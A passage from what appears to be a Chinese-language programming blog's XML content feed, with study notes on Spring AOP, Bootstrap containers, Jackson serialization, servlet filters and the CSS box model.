class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span> <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/aop/spring-aop.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sql&quot;</span> <span class="attr">class</span>=<span class="string">&quot;service.Sql&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;mong&quot;</span> <span class="attr">class</span>=<span class="string">&quot;service.Mong&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;beforeLog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;log.LogOupt&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    配置AOP对象--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        配置切入点 expression表达式 execution--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;pointcut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* service.Sql.*(..))&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        执行环绕--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;beforeLog&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointcut&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">&lt;!--    xml注册文件,其中需要关注的是aop的配置文件，一个切入点，也就是需要切入的类中的方法，而advisor则是一个执行方法范围--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>测试类则也是返回一个Database接口的bean</p><img src="/2021/10/14/Spring/Spring-AOP/image-20211014160249902.png" class="lazyload" data-srcset="/2021/10/14/Spring/Spring-AOP/image-20211014160249902.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211014160249902" style="zoom: 67%;"><p>执行结果：</p><img src="/2021/10/14/Spring/Spring-AOP/image-20211014160303377.png" class="lazyload" data-srcset="/2021/10/14/Spring/Spring-AOP/image-20211014160303377.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211014160303377" style="zoom:50%;"><h2 id="自定义类实现切面编程"><a href="#自定义类实现切面编程" class="headerlink" title="自定义类实现切面编程"></a>自定义类实现切面编程</h2><img src="/2021/10/14/Spring/Spring-AOP/image-20211014161238193.png" class="lazyload" data-srcset="/2021/10/14/Spring/Spring-AOP/image-20211014161238193.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211014161238193" style="zoom: 67%;"><h2 id="使用注解实现切面编程"><a href="#使用注解实现切面编程" class="headerlink" title="使用注解实现切面编程"></a>使用注解实现切面编程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实例一个切面类</span></span><br><span class="line"><span class="keyword">package</span> annotation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.ProceedingJoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.After;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Around;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Aspect;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Before;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogOut</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Before(&quot;execution(* service.Sql.*(..))&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[log]执行前···&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@After(&quot;execution(* service.Sql.*(..))&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[log]执行后···&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//proceedingJoinPoint 是一个连接点</span></span><br><span class="line">    <span class="meta">@Around(&quot;execution(* service.Sql.*(..))&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">around</span><span class="params">(ProceedingJoinPoint pj)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(pj.getTarget().getClass());</span><br><span class="line">        System.out.println(<span class="string">&quot;执行前！&quot;</span>);</span><br><span class="line">        pj.proceed();<span class="comment">//执行</span></span><br><span class="line">        System.out.println(<span class="string">&quot;执行后！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//其中注释@Aspect @Before @After 字面意思很容易理解 @Around环绕点则可以获取该方法的内容，并使用proceed()函数执行</span></span><br></pre></td></tr></table></figure><p>xml的配置：</p><img src="/2021/10/14/Spring/Spring-AOP/image-20211014163302119.png" class="lazyload" data-srcset="/2021/10/14/Spring/Spring-AOP/image-20211014163302119.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211014163302119" style="zoom:50%;"><p>运行结果：<img src="/2021/10/14/Spring/Spring-AOP/image-20211014163316842.png" class="lazyload" data-srcset="/2021/10/14/Spring/Spring-AOP/image-20211014163316842.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211014163316842" style="zoom:50%;"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>重拾Boostrap</title>
      <link href="/2021/10/12/%E5%89%8D%E7%AB%AF/%E9%87%8D%E6%8B%BEBoostrap/"/>
      <url>/2021/10/12/%E5%89%8D%E7%AB%AF/%E9%87%8D%E6%8B%BEBoostrap/</url>
      
        <content type="html"><![CDATA[<h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>容器1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: aqua;&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- &lt;div style=&quot;height: 100px; width: 100px; background-color: blue;&quot;&gt;&lt;/div&gt; --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width: 100%; height: 100px;&quot;</span>&gt;</span>class=&quot;container&quot; style=&quot;background-color: aqua;&quot;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>容器2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container-fluid&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: yellow;&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- &lt;div style=&quot;height: 100px; width: 100px; background-color: blue;&quot;&gt;&lt;/div&gt; --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width: 100%; height: 100px;&quot;</span>&gt;</span>class=&quot;container-fluid&quot; style=&quot;background-color: aqua;&quot;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>container-fluid</code>是充满</p><img src="/2021/10/12/%E5%89%8D%E7%AB%AF/%E9%87%8D%E6%8B%BEBoostrap/image-20211012135150548.png" class="lazyload" data-srcset="/2021/10/12/%E5%89%8D%E7%AB%AF/%E9%87%8D%E6%8B%BEBoostrap/image-20211012135150548.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211012135150548" style="zoom:50%;">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java-Objectmap</title>
      <link href="/2021/10/11/Java/Java-Objectmap/"/>
      <url>/2021/10/11/Java/Java-Objectmap/</url>
      
        <content type="html"><![CDATA[<h1 id="FasterXML-Jackson"><a href="#FasterXML-Jackson" class="headerlink" title="FasterXML Jackson"></a>FasterXML Jackson</h1><p>​    序列化：将java对象转化为字节序列的过程。</p><p>​    反序列化：将字节序列转化为java对象的过程。 </p><h2 id="简单的序列化"><a href="#简单的序列化" class="headerlink" title="简单的序列化"></a>简单的序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String username;</span><br><span class="line">    <span class="keyword">public</span> String password;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getID</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> JsonProcessingException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化对象&quot;</span>);</span><br><span class="line">        Student student=<span class="keyword">new</span> Student();</span><br><span class="line">        student.username=<span class="string">&quot;helo&quot;</span>;</span><br><span class="line">        student.password=<span class="string">&quot;world&quot;</span>;</span><br><span class="line">        ObjectMapper objectMapper=<span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        System.out.println(objectMapper.writeValueAsString(student));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/11/Java/Java-Objectmap/image-20211011092020211.png" class="lazyload" data-srcset="/2021/10/11/Java/Java-Objectmap/image-20211011092020211.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211011092020211"></p><p>就算是没有声明ID也是可以返回，只要get方法是标准的</p><h2 id="简单的反序列化"><a href="#简单的反序列化" class="headerlink" title="简单的反序列化"></a>简单的反序列化</h2><p>将字符串转为Java对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(&quot;反序列对象&quot;);</span><br><span class="line">Student student1=objectMapper.readValue(&quot;&#123;\&quot;username\&quot;:\&quot;helo\&quot;,\&quot;password\&quot;:\&quot;world\&quot;&#125;&quot;,Student.class);</span><br><span class="line">System.out.println(objectMapper.writeValueAsString(student1));</span><br></pre></td></tr></table></figure><p>只要属性名是真是存在的，就不会报错，如果是没有赋值的话则会初始化成null</p><p>*<strong>在默认情况下（即不对ObjectMapper做任何额外配置，也不对Java对象加任何Annotation），ObjectMapper依赖于Java对象的默认的无参构造函数进行反序列化，并且严格地通过getter和setter的命名规约进行序列化和反序列化。*</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb_Filter</title>
      <link href="/2021/10/09/JavaWeb/JavaWebFilter/"/>
      <url>/2021/10/09/JavaWeb/JavaWebFilter/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Filter"><a href="#1-Filter" class="headerlink" title="1.Filter"></a>1.Filter</h1><p>为了把一些公用逻辑从各个Servlet中抽离出来，JavaEE的Servlet规范还提供了一种Filter组件，即过滤器，它的作用是，在HTTP请求到达Servlet之前，可以被一个或多个Filter预处理，类似打印日志、登录检查等逻辑，完全可以放到Filter中。</p><img src="/2021/10/09/JavaWeb/JavaWebFilter/image-20211009193109865.png" class="lazyload" data-srcset="/2021/10/09/JavaWeb/JavaWebFilter/image-20211009193109865.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211009193109865" style="zoom:67%;"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebFilter(&quot;/user/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AuthFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;AuthFilter: check authentication&quot;</span>);</span><br><span class="line">        HttpServletRequest req = (HttpServletRequest) request;</span><br><span class="line">        HttpServletResponse resp = (HttpServletResponse) response;</span><br><span class="line">        <span class="keyword">if</span> (req.getSession().getAttribute(<span class="string">&quot;user&quot;</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 未登录，自动跳转到登录页:</span></span><br><span class="line">            System.out.println(<span class="string">&quot;AuthFilter: not signin!&quot;</span>);</span><br><span class="line">            resp.sendRedirect(<span class="string">&quot;/signin&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 已登录，继续处理:</span></span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的注释代表着Fitter只过滤/user请求的，/test这类请求并不会被该方法过滤，并且，其中的if循环可以看到有判断当前用户是否有登陆，如果有登陆则继续处理，如果没有登陆则重定向到/signin</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/"/>
      <url>/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p>title: 盒子模型<br>date: 2021-07-19 00:04:18<br>tags:</p><h1 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h1><ol><li>内容区域 content</li><li>内边距区域 padding</li><li>边框区域 border</li><li>外边距区域 margin</li></ol><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719130714777.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719130714777.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210719130714777" style="zoom:67%;"><h2 id="边框区域border"><a href="#边框区域border" class="headerlink" title="边框区域border"></a>边框区域border</h2><ol><li>border-width</li><li>border-style(必须设置)：solid实线、dashed虚线、dotted点线</li><li>border-color</li></ol><p>连写：<code>border: 10px solid red；</code></p><p>单方向设置<code>border-top/bottom/right/left：....;</code></p><h2 id="内边框-padding"><a href="#内边框-padding" class="headerlink" title="内边框 padding"></a>内边框 padding</h2><p>顺时针赋值 <code>padding:  xx xx xx xx ;</code>上右下左</p><p><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719134101603.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719134101603.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210719134101603"></p><h2 id="自动内减"><a href="#自动内减" class="headerlink" title="自动内减"></a>自动内减</h2><p>设置一个属性浏览器会自动计算多出了多少，自动在内容中间去CSS3盒模型</p><p><code>属性名：box-sizing；属性值：border-box</code></p><p><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719140026097.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719140026097.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210719140026097"></p><h2 id="外边距"><a href="#外边距" class="headerlink" title="外边距"></a>外边距</h2><p><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719140915985.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719140915985.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210719140915985"></p><p>垂直布局的块级元素，上下的margin会进行合并，最终两者的距离为margin的最大值</p><p><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719150119686.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719150119686.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210719150119686"></p><h6 id="1-塌陷现象"><a href="#1-塌陷现象" class="headerlink" title="1.塌陷现象"></a>1.塌陷现象</h6><p>互相嵌套的<strong>块级元素</strong>，子元素的margin-top会作用在父元素上，导致父元素一起往下移动</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.father</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.son</span>&#123;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时移动的是father整体元素往下移动，因为父子元素的margin-top元素合并了</p><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719151124681.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719151124681.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210719151124681" style="zoom:50%;"><p><strong>解决方式：</strong></p><ol><li>给父元素设置border-top或者padding-top（分割父子元素的margin-top）</li><li>给父元素设置overflow；hidden</li><li>转换为行内块元素，合并现象只出现在<strong>块级元素</strong></li><li>设置浮动</li></ol><h6 id="2-行内元素的margin和padding无效情况"><a href="#2-行内元素的margin和padding无效情况" class="headerlink" title="2.行内元素的margin和padding无效情况"></a>2.行内元素的margin和padding无效情况</h6><p>给行内元素设置margin和padding时：<strong>水平方向的margin和padding布局中有效</strong>；垂直方向的margin和padding布局中无效</p><h1 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h1><h2 id="结构伪类选择器"><a href="#结构伪类选择器" class="headerlink" title="结构伪类选择器"></a>结构伪类选择器</h2><p>能够使用结构伪类选择器在HTML中定位元素</p><p><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719152636006.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719152636006.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210719152636006"></p><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719154327717.png" class="lazyload" data-srcset="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719154327717.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210719154327717" style="zoom:67%;"><p><img src="/2021/10/09/%E5%89%8D%E7%AB%AF/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/image-20210719154153563.png" class="lazyload" 